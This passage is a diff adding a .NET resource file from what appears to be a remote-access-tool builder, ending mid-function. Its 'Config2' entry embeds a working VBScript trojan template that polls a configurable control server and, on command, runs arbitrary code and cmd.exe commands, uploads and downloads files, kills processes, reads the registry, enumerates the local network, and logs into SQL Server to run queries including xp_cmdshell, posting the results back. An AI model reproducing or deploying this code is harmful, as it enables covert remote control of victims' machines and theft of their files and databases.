@@ -1,0 +1,1155 @@
+<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="unknowen" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\unknowen.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="unknowen_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\unknowen-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows10" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows10.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows10_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows10-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows7" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows7.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows7_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows7-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="WindowsXP" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\WindowsXP.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="WindowsXP_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\WindowsXP-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows_Vista" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows Vista.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows_Vista_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Windows Vista-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Config2" xml:space="preserve">
+    <value>'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+host = "%HOST%"
+port = %PORT%
+installdir = "%temp%"
+lnkfile = false
+lnkfolder = false
+'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
+dim DJB 
+dim shellobj 
+set shellobj = wscript.createobject("wscript.shell")
+dim filesystemobj
+set filesystemobj = createobject("scripting.filesystemobject")
+dim httpobj
+set httpobj = createobject("msxml2.xmlhttp")
+'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
+installname = wscript.scriptname
+startup = shellobj.specialfolders ("startup") &amp; "\"
+installdir = shellobj.expandenvironmentstrings(installdir) &amp; "\"
+if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") &amp; "\"
+spliter = "qiQqi"
+sleep = 250 
+dim response
+dim cmd
+dim param
+dim Columns_line
+info = ""
+usbspreading = "False"
+startdate = ""
+dim oneonce
+dim reg_key1
+dim row_count
+'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
+ on error resume next
+instance
+while true
+ on error resume next
+install
+response = ""
+response = post ("ready","")
+cmd = split (response,spliter)
+select case cmd (0)
+case "exc"
+      param = cmd (1)
+	  'MsgBox "For Saftey"
+      execute param
+case "uns"
+      uninstall
+case  "sleep"
+      param = cmd (1)
+      sleep = eval (param)  
+case  "msg"
+	  param = cmd (1)
+	  MsgBox param
+case "open_fm"
+	 response = post ("open_fm","open_fm" &amp; spliter)
+case "fm_drives"
+	 response = post ("fm_drives","fm_drives" &amp; spliter &amp; enumdriver() &amp; spliter)
+case "fm_browse"
+	dim All_faf
+	dim dir_req
+	dir_req =  cmd (1)
+	All_faf = enumfaf (dir_req)
+	 response = post ("fm_browse","fm_browse" &amp; spliter &amp; All_faf &amp; spliter)
+case "open_proc"
+	 response = post ("open_proc","open_proc" &amp; spliter)
+case "get_proc"
+	dim All_proc
+	All_proc = enumprocess()
+	 response = post ("get_proc","get_proc" &amp; spliter &amp; All_proc &amp; spliter)
+case "kill_pro"  
+	param = cmd(1)
+    exitprocess param
+case "open_cmd"
+	response = post ("open_cmd","open_cmd" &amp; spliter &amp; cmdshell("") &amp; spliter)
+case "prc_cmd"
+	param = cmd(1)
+	dim res_cmd
+	res_cmd = cmdshell(param)
+	response = post ("resp_cmd","resp_cmd" &amp; spliter &amp; res_cmd &amp; spliter)
+case "open_reg"
+	 response = post ("open_reg","open_reg" &amp; spliter)
+case "get_reg"
+	dim All_reg
+	dim reg_Main
+	dim ky_PH
+	reg_Main =  cmd (1)
+	ky_PH =   cmd (2)
+	 All_reg = GET_KEys(reg_Main,ky_PH)
+	 response = post ("get_reg","get_reg" &amp; spliter &amp; All_reg &amp; spliter )
+case "run_fil"
+		dim Val_file
+		param = cmd(1)
+		   Dim shl  
+		Set shl = CreateObject("Wscript.Shell")  
+		Val_file = param 
+		Call shl.Run(""""&amp; Val_file &amp; """")  
+        Set shl = Nothing    
+case "sen_me_fil"
+		
+		param = cmd(1)
+		dim file_nme
+		file_nme = cmd(2)
+		dim Val_UP
+		Val_UP = ReadBinaryFile (param)
+		 
+		 response = post ("dwn_this" &amp; spliter &amp; file_nme &amp; spliter, Val_UP )
+		
+case "sendfileto"
+	   dim write_file_to 
+	   write_file_to = cmd(1) 'Dir to write file to with filename "Dir\file.ext"
+	   dim write_content
+	   write_content = cmd(2)
+	   dim Val_DW
+	   dim fil_cont_w
+	   fil_cont_w = decodeBase64 (write_content)
+	   Val_DW = SaveBinaryData (write_file_to,fil_cont_w)
+	   
+	   
+case "del_file"
+		dim del_file_fro 
+	   del_file_fro = cmd(1)
+	   deletefaf del_file_fro
+case "ren_file"
+	   dim ren_file_fro 
+	   ren_file_fro = cmd(1)
+	   dim new_name_file
+	   new_name_file = cmd(2)
+	   rename_filefaf ren_file_fro,new_name_file
+	   
+case "ren_folder"
+	   dim ren_folder_fro 
+	   ren_folder_fro = cmd(1)
+	   dim new_name_folder
+	   new_name_folder = cmd(2)
+	   rename_folderfaf ren_folder_fro,new_name_folder 
+	   
+case "create_fold"
+		 dim cre_folder_fro 
+	   cre_folder_fro = cmd(1)
+	   Create_folde cre_folder_fro
+case "open_lan_enum" 
+		
+	   response = post ("open_lan_enum","open_lan_enum" &amp; spliter)	   		
+ 
+ case "get_local_enum" 
+		 local_net_comp_ips = getLocal_ip_in_lan
+		response = post ("get_local_enum","get_local_enum" &amp; spliter &amp; local_net_comp_ips &amp; spliter)
+	 	   		
+ 
+case "open_Sql_login" 
+		
+	   response = post ("open_Sql_login","open_Sql_login" &amp; spliter)
+
+case "do_wind_auth_login" 
+		 
+		dim dbsx
+		dbsx = cmd(3)
+		Sql_con_string = "Provider=SQLOLEDB.1;Data Source=" &amp; dbsx &amp; ";Integrated Security=SSPI;Trusted_Connection=yes;"
+	    sql_login_status = TestODBC(Sql_con_string)
+		response = post ("sql_login_stat","sql_login_stat" &amp; spliter &amp; sql_login_status &amp; spliter &amp; Sql_con_string &amp; spliter)
+	   
+case "do_Sql_login" 
+		dim uid
+		uid = cmd(1)
+		dim pwd
+		pwd = cmd(2)
+		dim dbs
+		dbs = cmd(3)
+		Sql_con_string = "Provider=SQLOLEDB.1;Data Source=" &amp; dbs &amp; ";user id ='" &amp; uid &amp; "';password='" &amp; pwd &amp; "'"
+	    sql_login_status = TestODBC(Sql_con_string)
+		response = post ("sql_login_stat","sql_login_stat" &amp; spliter &amp; sql_login_status &amp; spliter &amp; Sql_con_string &amp; spliter)
+
+	
+case "dosqlqueryordselect"
+
+	dim Sql_query_str_ord
+	Sql_query_str_ord = cmd(1)
+	dim Sql_con_st_ord
+	Sql_con_st_ord = cmd(2)
+	Columns_line = ""
+	row_count = -1
+	if instr(Sql_query_str_ord,"Update") or instr(Sql_query_str_ord,"Delete") or instr(Sql_query_str_ord,"Insert") then 
+	Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
+	response = post ("ordselect_ref","ordselect_ref" &amp; spliter )
+		response = post ("sql_query","sql_query" &amp; spliter )
+	elseif instr(Sql_query_str_ord,"SELECT") then 
+	sql_run_stat = Test_No_error (Sql_query_str_ord,Sql_con_st_ord)'"success"
+	if instr(sql_run_stat,"uccess") then 
+		if instr(sql_run_stat,"s") then 
+		Get_Query_result_columns Sql_query_str_ord,Sql_con_st_ord 
+		response = post ("creSQLcol","creSQLcol" &amp; spliter &amp; Columns_line &amp; spliter &amp; row_count &amp; spliter)
+		Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
+		end if 
+	else 
+	response = post ("Sql_error","Sql_error" &amp; spliter &amp; sql_run_stat &amp; spliter )
+	end if 
+	elseif instr(Sql_query_str_ord,"xp_cmdshell") then 
+	sql_run_stat = Test_No_error (Sql_query_str_ord,Sql_con_st_ord)'"success"
+	if instr(sql_run_stat,"uccess") then 
+		if instr(sql_run_stat,"s") then 
+		Get_Query_result_columns Sql_query_str_ord,Sql_con_st_ord 
+		response = post ("creSQLcol","creSQLcol" &amp; spliter &amp; Columns_line &amp; spliter &amp; row_count &amp; spliter)
+		Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
+		end if 
+	else 
+	response = post ("Sql_error","Sql_error" &amp; spliter &amp; sql_run_stat &amp; spliter )
+	end if 
+
+	end if 
+	
+	'ordselect_ref
+ 
+	'Get_Query_result
+case "dosqlquerygetdatabases"
+dim Sql_query_str_dbs
+dim Sql_con_st_dbs
+	Sql_query_str_dbs = cmd(1)
+	Sql_con_st_dbs = cmd(2)
+	   sql_dbs_res = Get_databases(Sql_con_st_dbs)
+	   response = post ("dosqlquery","dosqlquery" &amp; spliter &amp; "getdatabases" &amp; spliter &amp; sql_dbs_res &amp; spliter)
+	'Get_databases
+case "dosqlquerygettables"
+dim Sql_query_str_tbls
+dim Sql_con_st_tbls
+dim Sql_query_str_tbls_dbname
+	Sql_query_str_tbls = cmd(1)
+	Sql_con_st_tbls = cmd(2)
+	Sql_query_str_tbls_dbname = cmd(3)
+	  sql_tbls_res = Get_tables(Sql_query_str_tbls,Sql_con_st_tbls)
+	   response = post ("dosqlquery","dosqlquery" &amp; spliter &amp; "gettables" &amp; spliter &amp; sql_tbls_res &amp; spliter &amp; Sql_query_str_tbls_dbname &amp; spliter)
+
+case "dosqlquerygetviews"
+dim Sql_query_str_vws
+dim Sql_con_st_vws
+dim Sql_query_str_vws_dbname
+	Sql_query_str_vws = cmd(1)
+	Sql_con_st_vws = cmd(2)	
+	Sql_query_str_vws_dbname = cmd(3)
+	sql_vws_res = Get_views(Sql_query_str_vws,Sql_con_st_vws)
+response = post ("dosqlquery","dosqlquery" &amp; spliter &amp; "getviews" &amp; spliter &amp; sql_vws_res &amp; spliter &amp; Sql_query_str_vws_dbname &amp; spliter)
+case "linked_svrs"
+	dim Sql_query_lnked
+	dim Sql_con_st_lnked
+	Sql_query_lnked = cmd(1)
+	Sql_con_st_lnked= cmd(2)	
+	sql_lnked_res = Get_linked_svrs(Sql_query_lnked,Sql_con_st_lnked)
+	response = post ("dosqlquery","dosqlquery" &amp; spliter &amp; "linked_svrs" &amp; spliter &amp; sql_lnked_res &amp; spliter &amp; "" &amp; spliter )
+end select
+wscript.sleep sleep
+wend
+
+function Get_linked_svrs(SQL_QUEY,Conn_string)
+on error resume next 
+dim All_lnked
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery= SQL_QUEY  
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+While NOT obj1.EOF
+    ' Loop through each field
+    For Each field In obj1.Fields
+	
+	All_lnked = All_lnked &amp; field.Value   &amp; "lnked_splt"   
+   '  output.Write field.Value &amp; " "
+    next
+    obj1.MoveNext
+   ' output.WriteLine
+Wend
+
+obj.close                             'Closing the connection object
+obj1.close                      'Closing the connection object
+Set obj1=Nothing              'Releasing Recordset object
+Set obj=Nothing                'Releasing Connection object
+Get_linked_svrs = All_lnked  &amp; "lnked_splt"   &amp; "sql_lnked_end"
+end function 
+
+Function getLocal_ip_in_lan()
+On Error Resume Next
+getLocal_ip_in_lan = ""
+strQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress &gt; ''"
+
+Set objWMIService = GetObject( "winmgmts://./root/CIMV2" )
+Set colItems      = objWMIService.ExecQuery( strQuery, "WQL", 48 )
+
+For Each objItem In colItems
+    If IsArray( objItem.IPAddress ) Then
+        If UBound( objItem.IPAddress ) = 0 Then
+            strIP = "IP Address: " &amp; objItem.IPAddress(0)
+        Else
+            strIP = "IP Addresses: " &amp; Join( objItem.IPAddress, "ip_splt_i" )
+        End If
+    End If
+Next
+
+	
+ getLocal_ip_in_lan =strIP
+End Function
+
+function Get_databases(Conn_string)
+on error resume next 
+dim All_databases
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery="SELECT name FROM sys.databases"'Creating a query  "Provider=Microsoft.ACE.OLEDB.12.0" SQLQLEDB
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+While NOT obj1.EOF
+    ' Loop through each field
+    For Each field In obj1.Fields
+	All_databases = All_databases &amp; field.Value   &amp; "db_splt"   
+   '  output.Write field.Value &amp; " "
+    next
+    obj1.MoveNext
+   ' output.WriteLine
+Wend
+obj.close                             'Closing the connection object
+obj1.close                      'Closing the connection object
+Set obj1=Nothing              'Releasing Recordset object
+Set obj=Nothing                'Releasing Connection object
+Get_databases = All_databases
+end function 
+
+function Get_tables(SQL_QUEY,Conn_string)
+on error resume next 
+dim All_tables
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery= SQL_QUEY  
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+While NOT obj1.EOF
+    ' Loop through each field
+    For Each field In obj1.Fields
+	
+	All_tables = All_tables &amp; field.Value   &amp; "table_splt"   
+   '  output.Write field.Value &amp; " "
+    next
+    obj1.MoveNext
+   ' output.WriteLine
+Wend
+
+obj.close                             'Closing the connection object
+obj1.close                      'Closing the connection object
+Set obj1=Nothing              'Releasing Recordset object
+Set obj=Nothing                'Releasing Connection object
+Get_tables = All_tables  &amp; "table_splt"   &amp; "sql_rtables_end"
+end function 
+function Get_views(SQL_QUEY,Conn_string)
+on error resume next 
+dim All_views
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery=  SQL_QUEY 
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+While NOT obj1.EOF
+    ' Loop through each field
+    For Each field In obj1.Fields
+	All_views = All_views &amp; field.Value   &amp; "view_splt"   
+   '  output.Write field.Value &amp; " "
+    next
+    obj1.MoveNext
+   ' output.WriteLine
+Wend
+obj.close                             'Closing the connection object
+obj1.close                      'Closing the connection object
+Set obj1=Nothing              'Releasing Recordset object
+Set obj=Nothing                'Releasing Connection object
+Get_views = All_views &amp; "view_splt" &amp; "sql_rtables_end"
+end function 
+function Get_Query_result_columns(query_sql,Conn_string)
+on error resume next 
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery= query_sql
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+
+For intColIndex = 0 To obj1.Fields.Count - 1 
+   Columns_line = Columns_line &amp; obj1.Fields(intColIndex).Name &amp; "col_splt"
+Next
+While NOT obj1.EOF
+	 row_count = row_count + 1
+	 obj1.MoveNext
+Wend
+Columns_line = Columns_line &amp; "col_end"
+end function 
+sub Get_Query_result(query_sql,Conn_string)
+on error resume next 
+Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
+Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
+Dim dbquery       'Declaring a database query variable bquery 
+Dbquery= query_sql
+
+if instr(Dbquery,"Update") or instr(Dbquery,"Delete") or instr(Dbquery,"Insert") then 
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+dim httpobj2
+set httpobj2 = createobject("msxml2.xmlhttp")	  
+httpobj2.open "POST","http://" &amp; host &amp; ":" &amp; port &amp;"/" &amp; "ordselect_ref", false
+httpobj2.setrequestheader "User-Agent:",information
+httpobj2.send "ordselect_ref" &amp; spliter &amp; fields_result &amp; spliter
+ 
+return
+
+
+elseif instr(Dbquery,"SELECT") then 
+
+
+obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
+obj1.Open dbquery,obj   'Executing the query using recordset  
+rows_count_i = -1
+cols_count_j = -1
+rows_count_other = obj1.Fields.Count - 1
+While NOT obj1.EOF
+cols_count_j = -1
+	rows_count_i =rows_count_i+1
+	dim fields_result
+	fields_result = ""
+	For Each field In obj1.Fields
+	cols_count_j = cols_count_j + 1
+	fields_result = fields_result &amp; "" &amp; field.Value   &amp; "#!#"  &amp; rows_count_i &amp; "#!#" &amp; cols_count_j  &amp; "#!#" &amp; "field_splt"
+    next
+fields_result = fields_result &amp;  "field_end"
+dim httpobj3
+set httpobj3 = createobject("msxml2.xmlhttp")	  
+httpobj3.open "POST","http://" &amp; host &amp; ":" &amp; port &amp;"/" &amp; "ord_sql_cell", false
+httpobj3.setrequestheader "User-Agent:",information
+httpobj3.send "ord_sql_cell" &amp; spliter &amp; fields_result &amp; spliter
+ 
+    obj1.MoveNext
+Wend
+obj1.close
+obj.close                            
+Set obj1=Nothing
+Set obj=Nothing    
+ 
+       
+end if 
+
+
+
+
+end sub
+Function Test_No_error(SQL_Qru,Conn_string)
+
+On Error GoTo 0
+	Test_No_error = ""
+    Set DB = CreateObject("ADODB.Connection")
+    DB.Open Conn_string
+    If Err then
+      '  MsgBox "Error: " &amp; Err.Number &amp; " - " &amp; Err.Description
+        Test_No_error = Err.Description
+    Else
+        SQL = SQL_Qru
+        Set RS = DB.Execute(SQL)
+        If Err then
+           ' MsgBox "Error: " &amp; Err.Number &amp; " - " &amp; Err.Description
+            Test_No_error = Err.Description
+			Else
+			Test_No_error = "success"
+        End If
+    End if
+
+End Function
+Function TestODBC(Conn_string)
+
+On Error Resume Next
+	TestODBC = ""
+    Set DB = CreateObject("ADODB.Connection")
+    DB.Open Conn_string
+    If Err then
+      '  MsgBox "Error: " &amp; Err.Number &amp; " - " &amp; Err.Description
+        TestODBC = Err.Description
+    Else
+        SQL = "SELECT name FROM sys.databases"
+        Set RS = DB.Execute(SQL)
+        If Err then
+           ' MsgBox "Error: " &amp; Err.Number &amp; " - " &amp; Err.Description
+            TestODBC = Err.Description
+			Else
+			TestODBC = "login_success"
+        End If
+    End if
+
+End Function
+
+
+sub Create_folde(folde_nam1)
+ On Error Resume Next
+filesystemobj.CreateFolder folde_nam1
+end sub 
+Sub rename_folderfaf(folder_n1 , folder_n2 )
+ On Error Resume Next
+	filesystemobj.MoveFolder folder_n1 , folder_n2
+End Sub
+Sub rename_filefaf(file_n1 , file_n2 )
+    On Error Resume Next
+    filesystemobj.MoveFile file_n1 , file_n2
+End Sub
+Sub deletefaf(file_ur)
+        On Error Resume Next
+		filesystemobj.deletefile(file_ur)
+        filesystemobj.deletefolder(file_ur)
+
+End Sub
+private function decodeBase64(base64)
+  dim DM, EL
+  Set DM = CreateObject("Microsoft.XMLDOM")
+  ' Create temporary node with Base64 data type
+  Set EL = DM.createElement("tmp")
+  EL.DataType = "bin.base64"
+  ' Set encoded String, get bytes
+  EL.Text = base64
+  decodeBase64 = EL.NodeTypedValue
+end function
+ 
+Function SaveBinaryData(FileName, ByteArray)
+  Const adTypeBinary = 1
+  Const adSaveCreateOverWrite = 2
+  
+  'Create Stream object
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  
+  'Specify stream type - we want To save binary data.
+  BinaryStream.Type = adTypeBinary
+  
+  'Open the stream And write binary data To the object
+  BinaryStream.Open
+  BinaryStream.Write ByteArray
+  
+  'Save binary data To disk
+  BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
+End Function
+
+Function ReadBinaryFile(FileName)
+  Const adTypeBinary = 1
+  
+  'Create Stream object
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  
+  'Specify stream type - we want To get binary data.
+  BinaryStream.Type = adTypeBinary
+  
+  'Open the stream
+  BinaryStream.Open
+  
+  'Load the file data from disk To stream object
+  BinaryStream.LoadFromFile FileName
+  
+  'Open the stream And get binary data from the object
+  ReadBinaryFile = BinaryStream.Read
+End Function
+Function upload(fileurl)
+
+        Dim objstreamuploade, buffer
+        objstreamuploade = CreateObject("adodb.stream")
+        With objstreamuploade
+            .type = 1
+            .open()
+            .loadfromfile(fileurl)
+            buffer = .read
+            .close()
+        End With
+        objstreamdownload = Nothing
+		 
+		'dim httpobj
+        'httpobj = CreateObject("msxml2.xmlhttp")
+        'httpobj.open "post", "http://" &amp; host &amp; ":" &amp; port &amp; "/" &amp; "is-recving" &amp; spliter &amp; fileurl, false
+		'httpobj.send "dwn_this"&amp; spliter &amp; buffer
+		upload = buffer
+End Function
+
+
+
+
+
+
+
+Function cmdshell(cmd_com)
+
+Dim ObjExec
+Dim strFromProc
+ 
+Set objShell = WScript.CreateObject("WScript.Shell")
+Set ObjExec = objShell.Exec("cmd.exe /c " &amp; cmd_com)
+Do
+    strFromProc = strFromProc &amp; vbCrLf  &amp; ObjExec.StdOut.ReadLine()
+Loop While Not ObjExec.Stdout.atEndOfStream
+
+        cmdshell = strFromProc
+		
+    End Function
+
+
+
+function Read_Reg_V(reg_read)
+reg_read = Replace(reg_read,"\\","\")
+Set objShell = WScript.CreateObject("WScript.Shell")
+Read_Reg_V = objShell.RegRead(reg_read) 
+end function
+function ADD_KEY(reg_key,key_path_entry)
+ on error resume next
+dim strComputer
+dim All_KS
+dim ALL_VLS
+Const HKEY_CLASSES_ROOT = &amp;H80000000
+Const HKEY_CURRENT_USER = &amp;H80000001
+Const HKEY_LOCAL_MACHINE = &amp;H80000002
+Const HKEY_USERS = &amp;H80000003
+Const HKEY_CURRENT_CONFIG = &amp;H80000005
+
+dim Key_INT32 
+select case reg_key
+	case "HKEY_CLASSES_ROOT"
+	Key_INT32 = HKEY_CLASSES_ROOT
+	case "HKEY_CURRENT_USER"
+	Key_INT32 = HKEY_CURRENT_USER
+	case "HKEY_LOCAL_MACHINE"
+	Key_INT32 = HKEY_LOCAL_MACHINE
+	case "HKEY_USERS"
+	Key_INT32 = HKEY_USERS
+	case "HKEY_CURRENT_CONFIG"
+	Key_INT32 = HKEY_CURRENT_CONFIG
+end select
+strComputer = "."
+Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
+    &amp; strComputer &amp; "\root\default:StdRegProv")
+strKeyPath = key_path_entry
+objReg.CreateKey Key_INT32,strKeyPath
+end function 
+function Delete_KEY(reg_key,key_path_entry)
+ on error resume next
+dim strComputer
+dim All_KS
+dim ALL_VLS
+Const HKEY_CLASSES_ROOT = &amp;H80000000
+Const HKEY_CURRENT_USER = &amp;H80000001
+Const HKEY_LOCAL_MACHINE = &amp;H80000002
+Const HKEY_USERS = &amp;H80000003
+Const HKEY_CURRENT_CONFIG = &amp;H80000005
+
